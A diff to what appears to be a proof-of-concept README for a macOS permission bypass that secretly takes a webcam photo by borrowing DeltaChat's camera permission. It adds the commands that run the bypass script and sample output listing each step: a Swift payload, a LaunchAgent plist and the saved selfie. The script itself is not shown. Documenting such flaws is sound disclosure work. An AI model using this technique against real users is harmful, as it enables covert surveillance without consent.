@@ -29,7 +29,25 @@ A picture is taken using the system webcam, without Terminal having any camera
 
 ### Manual 
 
-TODO: xxx
+Clone the repository and then execute the automated bash script, creating the necessary files and 
+```sh
+bash deltachat_camera_bypass.sh
+# or
+chmod +x deltachat_camera_bypass.sh && ./deltachat_camera_bypass.sh
+```
+
+Example output:
+```sh
+kunpeeks@MacBook-Pro-van-Kun 1 % ./deltachat_camera_bypass.sh
+[*] Step 1: Write Swift camera payload to /tmp/selfie_payload.swift
+[*] Step 2: Compile Swift payload to /Users/kunpeeks/Desktop/selfie
+[*] Step 3: Create LaunchAgent plist at /Users/kunpeeks/Library/LaunchAgents/com.deltachat.tcc.camera.plist
+[*] Step 4: Load LaunchAgent and trigger DeltaChat
+[*] Waiting 5 seconds for selfie to complete...
+[*] Checking selfie result:
+[+] Selfie saved at /tmp/selfie.jpg
+```
+
 
 ### Prompt Spoofing
 
